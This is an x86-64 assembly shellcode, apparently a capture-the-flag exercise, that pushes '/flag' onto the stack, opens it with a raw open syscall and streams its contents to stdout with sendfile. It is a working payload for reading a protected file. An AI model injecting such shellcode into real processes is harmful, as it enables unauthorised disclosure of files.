.intel_syntax noprefix
.global _start
_start:
     mov rbx,0x67616c66
	shl rbx,8
	mov bl,0x2f
     push rbx
	xor rax,rax
	add rax,2
     mov rdi,rsp
     xor rsi,rsi
     syscall
	
	xor rdi,rdi
     add rdi,1
     mov rsi,rax
     xor rdx,rdx
	xor r10,r10
	add r10,99
	xor rax,rax
	add rax,40        
     syscall
	
	xor rax,rax
     add rax,60
     syscall
